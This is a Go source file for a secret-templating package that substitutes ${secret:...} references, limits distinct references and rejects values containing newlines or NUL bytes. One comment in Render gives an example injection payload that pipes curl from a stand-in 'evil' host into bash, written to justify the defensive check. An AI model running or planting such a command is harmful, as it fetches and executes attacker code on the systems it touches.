// Package secrettemplate renders templates that embed Keyorix secret references,
// expanding ${secret:<ref>} placeholders to their values. It is the pure, transport-
// and storage-agnostic core: the caller supplies a Resolver that maps a reference to
// a value (with its own permission checks). Rendered output is never logged by this
// package.
package secrettemplate

import (
	"fmt"
	"strings"
)

// marker is the placeholder prefix; a reference looks like ${secret:<ref>}.
const marker = "${secret:"

// MaxDistinctReferences caps the number of distinct secret references a single
// template may name. Repeated occurrences of the same reference are deduped and
// resolved only once (see Render), so this bounds the number of resolver calls —
// and therefore the number of secret decryptions / audit reads — a single render
// can trigger, regardless of how many placeholder occurrences the template text
// contains. A template naming more references than this is rejected outright,
// before any resolver call is made. 100 comfortably covers realistic .env/config
// rendering use cases.
const MaxDistinctReferences = 100

// Resolver maps a secret reference (the text between "${secret:" and "}") to its
// value. It returns an error when the reference is unknown or inaccessible.
type Resolver func(ref string) (string, error)

// segment is one piece of a parsed template: a literal text run, or a secret
// reference to be substituted (ref is non-empty in that case).
type segment struct {
	ref     string
	literal string
}

// parse splits tmpl into literal/reference segments and returns the distinct
// references it names, in first-seen order — without calling any resolver.
// Doing this as a standalone pass lets Render enforce MaxDistinctReferences (and
// reject a malformed template) before any resolver call — and therefore before
// any decryption work — happens. Rules:
//   - "$$" collapses to a literal "$" — so "$${secret:x}" is the literal text
//     "${secret:x}" without naming a reference.
//   - a "$" not part of "$$" or a placeholder is literal.
//   - an unterminated placeholder (no closing "}") or an empty ref is an error.
//   - a template naming more than MaxDistinctReferences distinct references is
//     an error.
func parse(tmpl string) (segments []segment, distinct []string, err error) { // NOSONAR -- cognitive complexity 25, suppress go:S3776
	seen := make(map[string]bool)
	for i := 0; i < len(tmpl); {
		c := tmpl[i]
		if c != '$' {
			j := i + 1
			for j < len(tmpl) && tmpl[j] != '$' {
				j++
			}
			segments = append(segments, segment{literal: tmpl[i:j]})
			i = j
			continue
		}
		// c == '$'
		if i+1 < len(tmpl) && tmpl[i+1] == '$' {
			segments = append(segments, segment{literal: "$"}) // "$$" -> "$"
			i += 2
			continue
		}
		if strings.HasPrefix(tmpl[i:], marker) {
			rest := tmpl[i+len(marker):]
			end := strings.IndexByte(rest, '}')
			if end < 0 {
				return nil, nil, fmt.Errorf("unterminated ${secret:…} placeholder at offset %d", i)
			}
			ref := strings.TrimSpace(rest[:end])
			if ref == "" {
				return nil, nil, fmt.Errorf("empty secret reference at offset %d", i)
			}
			if !seen[ref] {
				if len(distinct) >= MaxDistinctReferences {
					return nil, nil, fmt.Errorf("template names more than %d distinct secret references (limit is %d)", MaxDistinctReferences, MaxDistinctReferences)
				}
				seen[ref] = true
				distinct = append(distinct, ref)
			}
			segments = append(segments, segment{ref: ref})
			i += len(marker) + end + 1 // past the closing '}'
			continue
		}
		// A lone '$' that doesn't start a placeholder.
		segments = append(segments, segment{literal: "$"})
		i++
	}
	return segments, distinct, nil
}

// Render expands every ${secret:<ref>} placeholder in tmpl using resolve and returns
// the result. See parse for the placeholder syntax rules and the
// MaxDistinctReferences cap; a resolver error aborts the render, naming the
// offending reference.
//
// Each distinct reference is resolved (resolve is called) at most once, in
// first-seen order; repeated occurrences of the same reference in tmpl reuse the
// already-resolved value rather than calling resolve again. This avoids
// redundant decryption work — and, on the server-side resolver, redundant
// audit/read-logging — when a template repeats a reference, and combined with
// MaxDistinctReferences bounds the total resolver work a single render can
// trigger regardless of how many placeholder occurrences the template contains.
func Render(tmpl string, resolve Resolver) (string, error) {
	segments, distinct, err := parse(tmpl)
	if err != nil {
		return "", err
	}

	resolved := make(map[string]string, len(distinct))
	for _, ref := range distinct {
		val, err := resolve(ref)
		if err != nil {
			return "", fmt.Errorf("resolve %q: %w", ref, err)
		}
		// This package is a raw, format-agnostic substitution engine: it has no idea
		// whether the caller's template is a .env file, a YAML/JSON document, or a
		// shell script, so it can't apply format-specific escaping (quoting a YAML
		// scalar, JSON-string-escaping, shell-quoting, ...). What every one of those
		// targets shares, though, is that an embedded newline/CR turns one substituted
		// value into multiple *lines* of output, and the documented use case
		// (internal/cli/secret/render.go) is exactly "write this straight to a .env/
		// config file, which may later be sourced". A secret's value is set by
		// whoever has write access to that one secret — who may be far less trusted
		// than the template's author or the file's eventual consumer — so a value
		// containing "\ncurl evil|bash\n#" would silently smuggle extra executable
		// lines into the rendered file. Rather than silently stripping/altering the
		// secret value (surprising, and could itself corrupt a legitimately multi-line
		// value), reject the render outright: this matches Render's existing all-or-
		// nothing failure model for a resolver error, and forces the operator to
		// notice rather than silently ship injected content. NUL is rejected for the
		// same reason (embedded NUL truncates/corrupts many downstream parsers).
		if strings.ContainsAny(val, "\n\r\x00") {
			return "", fmt.Errorf("resolve %q: secret value contains a newline, carriage return, or NUL byte and cannot be safely substituted into a single-line template output", ref)
		}
		resolved[ref] = val
	}

	var b strings.Builder
	for _, seg := range segments {
		if seg.ref == "" {
			b.WriteString(seg.literal)
			continue
		}
		b.WriteString(resolved[seg.ref])
	}
	return b.String(), nil
}

// References returns the distinct secret references in tmpl, in first-seen order,
// without resolving them — useful for a dry-run / "what does this template need?"
// preflight. Malformed placeholders, or a template exceeding MaxDistinctReferences,
// are reported as an error, matching Render.
func References(tmpl string) ([]string, error) {
	_, distinct, err := parse(tmpl)
	if err != nil {
		return nil, err
	}
	return distinct, nil
}
